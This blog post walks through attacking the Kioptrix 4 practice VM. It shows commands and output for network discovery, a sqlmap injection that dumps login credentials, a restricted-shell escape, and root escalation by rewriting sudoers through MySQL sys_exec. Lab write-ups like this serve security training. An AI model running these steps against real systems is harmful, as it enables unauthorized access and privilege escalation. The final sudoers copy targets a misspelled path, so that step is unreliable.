---
layout: post
title: Kioptrix 4 - Walkthrough
---

I have done the fourth VM in the Kioptrix series. Another really great VM, a lot of fun.

For first I started out by finding the machine

```
netdiscover -r 192.168.1.0/24
```

Then I ran an nmap scan, from metasploit.

```
host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
192.168.1.105  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1.2 protocol 2.0
192.168.1.105  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
192.168.1.105  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
192.168.1.105  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
```

I found some that samba is running. But let's start with port 80.

On port 80 we face a login-screen. I ran sqlmap against it and found an injection in the mypassword parameter.

```
[19:08:51] [INFO] POST parameter 'mypassword' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable
```

```
sqlmap -r checklogin.txt -p mypassword --dbms=mysql -D members --dump  
```

And got this from the DB

```
Database: members
Table: members
[2 entries]
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
```

I used the credencials to ssh into the machine. There I was stuck with a really limited shell. I had to cheat here a bit because I didn't know how to proceed. But it turns out it was really quite simple to break out from that shell.

```
echo os.system("/bin/bash")
```

Here I ran some priv-esc scripts to map out the system. I found that mysql was running as root. And that it was not accessible from the outside world. So I guess that's why the sysadmin never bothered to add a root password. Not that it matters, if s/he would have added it, it would still be available in the php-file that connects to the database. Anyways, I logged in to mysql. First I tried to get this exploits to work: https://www.exploit-db.com/exploits/1518/
But since I didn't have access to gcc it was kind of hard. So after some cheating I learned about sys_exec

So I did

```
mysql -u root
SELECT sys_exec("cp /etc/sudoers /tmp/sudoers")
SELECT sys_exec("chmod 777 /tmp/sudoers")
```

Then I added john to sudo and then I did:
```
SELECT sys_exec("cp /tmp/sudoers /etc/sudiers")
```

Then

```
sudo su
```

And done.
